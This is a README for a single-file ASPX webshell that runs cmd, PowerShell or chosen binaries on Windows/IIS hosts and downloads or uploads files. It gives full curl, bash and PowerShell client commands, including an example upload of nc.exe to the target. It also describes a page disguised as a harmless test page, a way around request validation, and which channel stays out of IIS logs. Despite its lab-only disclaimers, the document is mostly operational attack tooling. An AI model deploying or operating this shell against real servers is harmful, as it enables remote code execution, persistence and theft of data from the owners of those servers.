# aspx webshell — single-file command console

*It cost me 0.30$ to vibe-edit! orignialy vibecoded by @jakobfriedl*
*It cost me 0.09$ to vibe-edit the hacker cringe version!*

One `.aspx` file. Runs commands on a Windows/IIS host, renders a host-info
panel, and accepts the same request over both GET and POST — two channels
with different tradeoffs. GET is the interactive channel: every command is
a URL, so the browser history doubles as command history. POST is the
tooling channel: large payloads, nothing in the query string.

Two skins, one shell: `index.aspx` (the straight version — looks like a
boring test page) and `h4x0r.aspx` (the 3l1t3 cringe edition: black
background, matrix rain, CRT scanlines, glitch title, full leetspeak —
the reskin cost another 0.09$ of vibes). Identical logic, identical
params, identical `command_result` markup: point `TARGET` at either file
and every client example below just works. `index.aspx` stays fully
self-contained; the cringe edition additionally pulls the Creepster and
VT323 TTFs from `fonts.gstatic.com` and a spinning cat from
`media.giphy.com` — client-side only (the operator's browser fetches
them, the target serves nothing external), but a proxy watching the
operator sees google + giphy traffic next to shell traffic. Cringe has
a price.

> Authorized targets only. This is a lab / reproduction tool, and it is
> deliberately loud — see [Logging](#logging--detection).

Loading the page with no parameters runs nothing and shows host info only
(machine name, OS, identity, ASP.NET version, local/UTC time).

## Requirements

- Windows + IIS with ASP.NET 4.x (`System.Web`) enabled
- Commands run as the **app pool identity** — configure that account deliberately
- Drop the file anywhere the app pool serves it

The file/subdirectory listing is dynamic: it defaults to the page's own
folder (`Server.MapPath(".")`) and follows the optional `dir` parameter.
Directories in the listing navigate; every file is a download link
(`action=download`); an upload form under the listing posts into the
folder currently shown — see [File transfer](#file-transfer-download--upload).


## Parameters

| Param       | Required        | Values             | Meaning                                             |
|-------------|-----------------|--------------------|-----------------------------------------------------|
| `action`    | yes             | `runUpdate`        | Gate. Absent → info-only page, nothing executes     |
|             |                 | `download`         | Stream `file` back as an attachment, no page render |
|             |                 | `upload`           | Accept a multipart file into `dir`                 |
| `mode`      | no              | `cmd` (default)    | `cmdargs` → `cmd.exe /c <cmdargs>`                  |
|             |                 | `ps`               | `cmdargs` → `powershell.exe -NoP -NonI -C "<args>"` |
|             |                 | `custom`           | run `custombin` with `cmdargs` as its arguments     |
| `cmdargs`   | per mode        | string             | The command / arguments                             |
| `custombin` | mode=custom     | path               | Full path to the binary                             |
| `dir`       | no              | path               | Directory for the listing + upload target; default = the folder the page lives in |
| `file`      | action=download | path               | Absolute path of the file to stream                 |


All of them can arrive in the query string (GET) or an urlencoded body
(POST). The page picks the bag by method: POST reads the body, everything
else reads the query string. Params split across both in one request are
**not** merged. One exception: the uploaded file only exists inside a
`multipart/form-data` body, so `action=upload` requests are POST by
nature (multipart still feeds `Request.Form`, so `action`/`dir` ride
along as regular fields).

## Browser use (GET console)

Type, Run. Each command becomes a URL like:

    /test.aspx?action=runUpdate&mode=cmd&cmdargs=whoami

which means:

- browser history = command history (`Ctrl+H` to browse; the omnibox
  autocompletes past command URLs)
- Back/Forward and refresh re-run commands — GET refresh never hits the
  "confirm form resubmission" prompt
- identical commands collapse into a single history entry (moved to top);
  distinct args are distinct entries
- hand-editing the URL works too: encode `&` as `%26`, spaces as `%20` or `+`

## File transfer (download / upload)

The listing doubles as a minimal file manager: directories are `dir` links
that navigate, every file is an `action=download` link (`target="_blank"`,
so the console stays put), and the upload form under the listing posts
into the directory currently shown.

### Download

The link is `?action=download&file=<absolute path>`. The page clears
itself, streams the file with `application/octet-stream` +
`Content-Disposition: attachment` and aborts — nothing else renders. Same
request in curl:

    curl -sG "$TARGET" \
      --data-urlencode "action=download" \
      --data-urlencode "file=C:\inetpub\wwwroot\test.aspx" \
      -o test.aspx

Bad path → no attachment; the normal page renders with the error in the
status `<div>` instead. Downloads are GETs, so the full remote path lands
in the IIS logs — see [Logging](#logging--detection).

### Upload

`multipart/form-data` POST — `curl -F` does the encoding:

    curl -s -F "action=upload" \
      -F "dir=C:\inetpub\wwwroot" \
      -F "upfile=@C:\tools\nc.exe" \
      "$TARGET"

The file is saved into `dir` under its client-side name only
(`Path.GetFileName` — any folder part of the client path is dropped),
overwriting silently if it already exists. The page re-renders with
`Uploaded N bytes to <path>` in the status `<div>` (`class="result"`)
or `Upload failed: ...` (`class="error"`). Extract with:

    | grep -oE '(Uploaded|Upload failed)[^<]*'

Ceiling: uploads inherit the POST channel's ~4 MB `maxRequestLength`
default — bigger bodies die with 404.13 before the page runs. Raise it in
`web.config` if you need more headroom.

## curl

### GET, full page

    TARGET="http://host/test.aspx"
    curl -sG "$TARGET" \
      --data-urlencode "action=runUpdate" \
      --data-urlencode "mode=cmd" \
      --data-urlencode "cmdargs=whoami"

`-G` moves the `--data-urlencode` pairs into the query string, so nothing
needs manual percent-encoding.

### Extracting only the command output

The result block is `<pre id="command_result">…</pre>`. Pipe the response
through this to drop the rest of the page:

    out() {
      awk '
        /<pre id="command_result">/ { sub(/.*<pre id="command_result">/,""); f=1 }
        f && /<\/pre>/               { sub(/<\/pre>.*/,""); print; exit }
        f
      '
    }

    curl -sG "$TARGET" --data-urlencode "action=runUpdate" \
      --data-urlencode "mode=cmd" --data-urlencode "cmdargs=whoami" | out

Why slicing with awk is safe here: the page HTML-encodes command output,
so the output itself can never contain a literal `</pre>` — the first
closing tag after the opening one is always the real end of the block.
Multiline output, single-line output and the no-trailing-newline edge all
work.

**If `out` prints nothing:** either the command produced no output (empty
output = the `<pre>` isn't rendered at all) or the launch failed and the
error went to the status `<div>` instead. Drop the `| out` once, look at
the raw page, fix, re-add it.

### Ready-made helper (bash; runs fine in Termux)

    #!/usr/bin/env bash
    TARGET="http://host/test.aspx"

    out() {
      awk '
        /<pre id="command_result">/ { sub(/.*<pre id="command_result">/,""); f=1 }
        f && /<\/pre>/               { sub(/<\/pre>.*/,""); print; exit }
        f
      '
    }

    run() {   # run "command" [mode] [custombin]
      curl -sG "$TARGET" \
        --data-urlencode "action=runUpdate" \
        --data-urlencode "mode=${2:-cmd}" \
        --data-urlencode "cmdargs=$1" \
        --data-urlencode "custombin=${3:-}" | out
    }

    run "whoami"
    run "Get-Process" ps
    run "-a" custom 'C:\Windows\System32\netstat.exe'

### HTML entities (exact output fidelity)

Output is HTML-encoded server-side. Append a decode stage when you need
byte-exact output:

    | sed -e 's/&lt;/</g' -e 's/&gt;/>/g' -e 's/&quot;/"/g' \
          -e "s/&#39;/'/g" -e 's/&amp;/\&/g'

Decode `&amp;` **last**, or you double-decode (`&amp;lt;` → `&lt;` → `<`).

### POST channel

    curl -s -X POST "$TARGET" \
      -d "action=runUpdate" \
      -d "mode=ps" \
      --data-urlencode "cmdargs=Get-Process | Sort-Object CPU -Descending | Select -First 20" | out

The body must be `application/x-www-form-urlencoded` (`curl -d` does this).
A JSON body leaves `Request.Form` empty and the page renders info-only.

## PowerShell client

    # GET
    $r = Invoke-WebRequest -UseBasicParsing "http://host/test.aspx?action=runUpdate&mode=cmd&cmdargs=whoami"
    if ($r.Content -match '(?s)<pre id="command_result">(.*?)</pre>') { $Matches[1] }

    # POST — a hashtable body is urlencoded for you
    $r = Invoke-WebRequest -UseBasicParsing -Method Post "http://host/test.aspx" `
         -Body @{ action='runUpdate'; mode='ps'; cmdargs='Get-ChildItem C:\' }
    if ($r.Content -match '(?s)<pre id="command_result">(.*?)</pre>') { $Matches[1] }

## Channel tradeoffs

|                            | GET                        | POST                            |
|----------------------------|----------------------------|---------------------------------|
| Browser form               | default                    | manual                          |
| Command in browser history | yes                        | no                              |
| Command in IIS logs        | yes — `cs-uri-query`       | no — W3C logs have no body field |
| Payload ceiling            | ~2048 chars (query string) | ~4 MB (`maxRequestLength`)      |
| Best for                   | interactive console        | tooling, long one-liners        |

Oversized GETs die before the page runs: IIS request filtering rejects
>2048-byte query strings (404.15) and ASP.NET separately rejects
>2048-char ones. Oversized uploads die the same way on the POST side —
`maxRequestLength` (~4 MB) trips with 404.13. Raise both if you need more
headroom.

## Gotchas

- **Request validation applies to both channels.** Query strings and form
  values containing HTML-ish sequences (`<` + a letter, `<!--`, `<#`)
  throw `HttpRequestValidationException` and the command never runs. Fix:
  `ValidateRequest="false"` on the `@Page` directive, or read via
  `Request.Unvalidated.QueryString[...]` on .NET 4.5+.
- Spaces and quotes are fine through the form or `--data-urlencode`; only
  hand-typed URLs need manual encoding.
- The execution context is the app pool identity, not your console user —
  `whoami` output is the source of truth.

## Logging & detection

Loud by design, and that cuts both ways. Every GET command lands in full
text in the IIS W3C logs (`cs-uri-query` is enabled by default) under
`C:\inetpub\logs\LogFiles\W3SVC*\u_ex*.log`, plus the browser's own
history — which is the point of the GET channel, and also why GET
webshells are trivial to hunt: a defender greps those logs for `action=`
and gets your entire session — every command **and** the full path of
every file pulled through `action=download`. POST bodies aren't logged
by IIS, which makes that channel (uploads included) quieter but not
stealthy — WAFs, EDR and proxies still see everything.

Keep it in the lab.

